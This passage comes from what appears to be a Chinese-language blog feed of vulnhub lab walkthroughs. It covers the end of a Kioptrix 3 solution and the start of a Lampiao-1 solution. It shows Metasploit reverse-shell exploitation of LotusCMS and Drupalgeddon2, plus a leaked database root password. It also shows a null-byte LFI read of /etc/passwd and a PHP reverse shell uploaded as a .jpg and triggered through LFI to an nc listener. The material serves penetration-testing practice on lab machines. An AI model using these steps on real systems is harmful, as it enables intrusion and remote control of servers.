<li>利用LotusCMS 3.0 eval（）远程命令执行漏洞</li>
</ul>
<p>使用msf中的exploit/multi/http/lcms_php_exec模块可以直接getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++</span></span><br><span class="line"> ____________</span><br><span class="line">&lt; metasploit &gt;</span><br><span class="line"> ------------</span><br><span class="line">       \   ,__,</span><br><span class="line">        \  (oo)____</span><br><span class="line">           (__)    )\</span><br><span class="line">              ||--|| *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.63-dev                          ]</span><br><span class="line">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/http/lcms_php_exec</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> RHOSTS 192.168.84.144</span><br><span class="line">RHOSTS =&gt; 192.168.84.144</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> payload generic/shell_reverse_tcp                                                                                                                                                             </span><br><span class="line">payload =&gt; generic/shell_reverse_tcp                                                                                                                                                                                                       </span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> LHOST 192.168.84.135</span><br><span class="line">LHOST =&gt; 192.168.84.135                                                                                                                                                                                                                    </span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; <span class="built_in">set</span> URI /                                                                                                                                                                                         </span><br><span class="line">URI =&gt; /</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.84.135:4444 </span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Command shell session 2 opened (192.168.84.135:4444 -&gt; 192.168.84.144:57666) at 2019-12-14 06:18:03 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>成功getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la gallery/</span><br><span class="line">total 164</span><br><span class="line">drwxr-xr-x 7 root root  4096 Apr 14  2011 .</span><br><span class="line">drwxr-xr-x 8 root root  4096 Apr 15  2011 ..</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK</span><br><span class="line">-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql</span><br><span class="line">-rw-r--r-- 1 root root   252 Apr 12  2011 g.php</span><br><span class="line">drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line">-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php</span><br><span class="line">-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php</span><br><span class="line">-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 index.php</span><br><span class="line">-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK</span><br><span class="line">-rw-r--r-- 1 root root   212 Apr 12  2011 login.php</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 p.php</span><br><span class="line">drwxrwxrwx 2 root root  4096 Apr 12  2011 photos</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php</span><br><span class="line">-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php</span><br><span class="line">-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php</span><br><span class="line">-rw-r--r-- 1 root root   215 Apr 12  2011 register.php</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 search.php</span><br><span class="line">-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php</span><br><span class="line">drwxr-xr-x 6 root root  4096 Apr 12  2011 themes</span><br><span class="line">-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span><br></pre></td></tr></table></figure>

<p>在gallery目录下发现phpmyadmin配置文件中的phpmyadmin的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat gallery/gconfig.php</span><br><span class="line">&lt;?php</span><br><span class="line">        error_reporting(0);</span><br><span class="line">        /*</span><br><span class="line">                A sample Gallarific configuration file. You should edit</span><br><span class="line">                the installer details below and save this file as gconfig.php</span><br><span class="line">                Do not modify anything <span class="keyword">else</span> <span class="keyword">if</span> you don<span class="string">&#x27;t know what it is.</span></span><br><span class="line"><span class="string">        */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Installer Details -----------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Enter the full HTTP path to your Gallarific folder below,</span></span><br><span class="line"><span class="string">        // such as http://www.yoursite.com/gallery</span></span><br><span class="line"><span class="string">        // Do NOT include a trailing forward slash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span></span><br><span class="line"><span class="string">        $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Setting Details -------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(!$g_mysql_c = @mysql_connect($GLOBALS[&quot;gallarific_mysql_server&quot;], $GLOBALS[&quot;gallarific_mysql_username&quot;], $GLOBALS[&quot;gallarific_mysql_password&quot;])) &#123;</span></span><br><span class="line"><span class="string">                echo(&quot;A connection to the database couldn&#x27;</span>t be established: <span class="string">&quot; . mysql_error());</span></span><br><span class="line"><span class="string">                die();</span></span><br><span class="line"><span class="string">&#125;else &#123;</span></span><br><span class="line"><span class="string">        if(!<span class="variable">$g_mysql_d</span> = @mysql_select_db(<span class="variable">$GLOBALS</span>[&quot;</span>gallarific_mysql_database<span class="string">&quot;], <span class="variable">$g_mysql_c</span>)) &#123;</span></span><br><span class="line"><span class="string">                echo(&quot;</span>The Gallarific database couldn<span class="string">&#x27;t be opened: &quot; . mysql_error());</span></span><br><span class="line"><span class="string">                die();</span></span><br><span class="line"><span class="string">        &#125;else &#123;</span></span><br><span class="line"><span class="string">                $settings=mysql_query(&quot;select * from gallarific_settings&quot;);</span></span><br><span class="line"><span class="string">                if(mysql_num_rows($settings)!=0)&#123;</span></span><br><span class="line"><span class="string">                        while($data=mysql_fetch_array($settings))&#123;</span></span><br><span class="line"><span class="string">                                $GLOBALS[&quot;&#123;$data[&#x27;</span>settings_name<span class="string">&#x27;]&#125;&quot;]=$data[&#x27;</span>settings_value<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现phpmyadmin的用户名密码：root/fuckeyou，直接登录然后getshell</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub52.jpg"></p>
<p>具体参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kZGQ0MWI4NDFjMzY=">phpmyadmin getshell<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>LFI漏洞组合利用</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.84.144/index.php?system=../../../../../../../etc/passwd%00.html</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub53.jpg"></p>
<p>使用之前的sql注入得到admin的密码下图所示登录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub54.jpg"></p>
<p>将php reverse shell木马后缀改成.jpg上传，然后右键得到图片的链接</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub55.jpg"></p>
<p>浏览器访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.84.144/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/x281lo68jw.jpg%00.html</span><br></pre></td></tr></table></figure>

<p>同时kali端nc监听成功返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">connect to [192.168.84.135] from kioptrix3.com [192.168.84.144] 37790</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server <span class="comment">#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span></span><br><span class="line"> 15:10:15 up  2:59,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">loneferr pts/0    192.168.84.135   12:27   21:13m  4.66s  0.01s sshd: loneferre</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
<p>6的一批！！！！！！</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Lampiao-1]</title>
    <url>/2020/04/07/Lampiao-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Lampião: 1<br>发布日期：2018年7月28日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Lampiao.zip</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhYUc0QUFhREIhQ0JMUlJZUXNBaFRPeVBKcXlqQzBCbHItd2VNSDlRTWRZYlBmTWowTEdlTQ==">https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1waWFvL0xhbXBpYW8uemlw">https://download.vulnhub.com/lampiao/Lampiao.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1waWFvL0xhbXBpYW8uemlwLnRvcnJlbnQ=">https://download.vulnhub.com/lampiao/Lampiao.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>您想继续在自己的实验室中进行黑客入侵吗？<br>试试这个全新的脆弱机器！“Lampião1”。root它！</p>
<p>级别：简单</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.17</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 00:0C:29:51:75:B7 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.66.17</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http?</span><br><span class="line">1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -p 22,80,1898 -v 192.168.66.17 --script=vuln</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     _____ _ _ </span><br><span class="line">|     |_|/ ___ ___ __ _ ___ _ _ </span><br><span class="line">|     \x20| __/ (_| __ \x20|_| |_ </span><br><span class="line">|     ___/ __| |___/ ___|__,_|___/__, ( ) </span><br><span class="line">|     |___/ </span><br><span class="line">|     ______ _ _ _ </span><br><span class="line">|     ___(_) | | | |</span><br><span class="line">|     \x20/ _` | / _ / _` | | | |/ _` | |</span><br><span class="line">|_    __,_|__,_|_| |_|</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-csrf: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.66.17</span></span><br><span class="line"><span class="string">|   Found the following possible CSRF vulnerabilities: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node&amp;destination=node</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/3</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/3&amp;destination=node/3</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/1</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/1&amp;destination=node/1</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/login&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-login</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/login&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/register&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-register-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/register&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/login&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-login</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/login&amp;amp;destination=node/1%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/password</span></span><br><span class="line"><span class="string">|     Form id: user-pass</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/password</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node&amp;amp;destination=node</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/register&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-register-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/register&amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/register</span></span><br><span class="line"><span class="string">|     Form id: user-register-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=user/register</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/3&amp;amp;destination=node/3</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/3&amp;destination=node/3%3Famp%253Bdestination%3Dnode/3</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=node/1&amp;amp;destination=node/1</span></span><br><span class="line"><span class="string">|     Form id: user-login-form</span></span><br><span class="line"><span class="string">|     Form action: /?q=node/1&amp;destination=node/1%3Famp%253Bdestination%3Dnode/1</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.66.17:1898/?q=user/login&amp;amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|     Form id: user-login</span></span><br><span class="line"><span class="string">|_    Form action: /?q=user/login&amp;amp;amp;destination=node/3%23comment-form</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|   /UPGRADE.txt: Drupal file</span><br><span class="line">|   /INSTALL.txt: Drupal file</span><br><span class="line">|   /INSTALL.mysql.txt: Drupal file</span><br><span class="line">|   /INSTALL.pgsql.txt: Drupal file</span><br><span class="line">|   /CHANGELOG.txt: Drupal v1</span><br><span class="line">|   /: Drupal version 7 </span><br><span class="line">|   /README.txt: Interesting, a readme.</span><br><span class="line">|   /includes/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /misc/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /modules/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /scripts/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|   /sites/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|_  /themes/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span></span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.7: </span><br><span class="line">|       CVE-2020-1934   7.5     https://vulners.com/cve/CVE-2020-1934</span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span><br><span class="line">|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226</span><br><span class="line">|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788</span><br><span class="line">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927</span><br><span class="line">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span><br><span class="line">|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798</span><br><span class="line">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span><br><span class="line">|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743</span><br><span class="line">|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161</span><br><span class="line">|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736</span><br><span class="line">|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523</span><br><span class="line">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span><br><span class="line">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185</span><br><span class="line">|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109</span><br><span class="line">|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118</span><br><span class="line">|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117</span><br><span class="line">|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span><br><span class="line">|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br></pre></td></tr></table></figure>

<p>Nmap扫描显示端口22、80、1898已打开，因此考虑在浏览器中打开IP地址以及端口1898。它提供了有关运行了Drupal的网页的线索。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub240.jpg"></li>
</ul>
<p>根据先前的线索，考虑过使用漏洞利用drupal_drupalgeddon2进行利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search drupalgeddon2</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  <span class="literal">false</span>            no        Dump payload <span class="built_in">command</span> output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP <span class="keyword">function</span> to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> RHOSTS 192.168.66.17</span><br><span class="line">RHOSTS =&gt; 192.168.66.17</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="built_in">set</span> RPORT 1898</span><br><span class="line">RPORT =&gt; 1898</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.66.6:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.66.17</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.66.6:4444 -&gt; 192.168.66.17:58696) at 2020-04-07 22:59:18 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sessions 1</span><br><span class="line">[*] Session 1 is already interactive.</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www/html</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified              Name</span><br><span class="line">----              ----     ----  -------------              ----</span><br><span class="line">100755/rwxr-xr-x  110781   fil   2018-04-19 15:39:33 -0400  CHANGELOG.txt</span><br><span class="line">100755/rwxr-xr-x  1481     fil   2018-04-19 15:39:33 -0400  COPYRIGHT.txt</span><br><span class="line">100755/rwxr-xr-x  1717     fil   2018-04-19 15:39:33 -0400  INSTALL.mysql.txt</span><br><span class="line">100755/rwxr-xr-x  1874     fil   2018-04-19 15:39:33 -0400  INSTALL.pgsql.txt</span><br><span class="line">100755/rwxr-xr-x  1298     fil   2018-04-19 15:39:33 -0400  INSTALL.sqlite.txt</span><br><span class="line">100755/rwxr-xr-x  17995    fil   2018-04-19 15:39:33 -0400  INSTALL.txt</span><br><span class="line">100755/rwxr-xr-x  18092    fil   2018-04-19 15:39:33 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  3427612  fil   2018-04-20 13:20:38 -0400  LuizGonzaga-LampiaoFalou.mp3</span><br><span class="line">100755/rwxr-xr-x  8710     fil   2018-04-19 15:39:33 -0400  MAINTAINERS.txt</span><br><span class="line">100755/rwxr-xr-x  5382     fil   2018-04-19 15:39:33 -0400  README.txt</span><br><span class="line">100755/rwxr-xr-x  10123    fil   2018-04-19 15:39:33 -0400  UPGRADE.txt</span><br><span class="line">100644/rw-r--r--  34715    fil   2018-04-20 13:09:26 -0400  audio.m4a</span><br><span class="line">100755/rwxr-xr-x  6604     fil   2018-04-19 15:39:33 -0400  authorize.php</span><br><span class="line">100755/rwxr-xr-x  720      fil   2018-04-19 15:39:33 -0400  cron.php</span><br><span class="line">40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  includes</span><br><span class="line">100755/rwxr-xr-x  529      fil   2018-04-19 15:39:33 